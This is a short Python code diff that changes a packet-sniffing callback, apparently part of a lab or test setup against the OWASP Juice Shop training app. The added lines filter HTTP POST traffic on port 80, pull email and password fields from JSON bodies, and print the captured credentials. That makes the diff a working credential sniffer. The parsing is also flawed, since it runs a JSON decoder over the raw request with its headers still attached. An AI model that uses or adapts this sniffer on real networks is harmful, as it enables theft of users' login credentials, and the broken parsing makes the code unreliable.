@@ -7,10 +7,20 @@ def sniff_packets(pkt):
         tcp = pkt[TCP]
         raw = pkt[Raw].load
 
-        # Check if the packet is an HTTP request
+        # Check if the packet is an HTTP POST request
         if tcp.dport == 80 and b'POST' in raw:
-            print("HTTP request detected")
-            print("Raw data:", raw)
+            # Check if the request data contains JSON
+            if b'Content-Type: application/json' in raw:
+                # Extract the JSON data from the raw payload
+                try:
+                    json_data = json.loads(raw.decode())
+                    email = json_data['email']
+                    password = json_data['password']
+                    print("JSON data containing email and password captured:")
+                    print(f"Email: {email}")
+                    print(f"Password: {password}")
+                except Exception as e:
+                    print(f"Error extracting JSON data: {e}")
 
 class TestOWASPJuiceShop(unittest.TestCase):
 
